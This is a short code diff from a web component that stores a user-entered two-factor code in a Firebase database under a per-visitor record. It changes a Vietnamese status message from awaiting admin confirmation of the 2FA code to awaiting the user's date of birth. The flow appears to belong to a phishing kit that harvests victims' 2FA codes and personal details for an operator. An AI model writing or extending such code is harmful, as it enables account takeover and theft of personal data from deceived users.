@@ -25,7 +25,7 @@ const FaCode = () => {
     ] = facode;
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "Đang chờ xác nhận 2fa từ admin";
+    ] = "Đang chờ user nhập ngày sinh";
 
     update(ref(database), updates);
   };
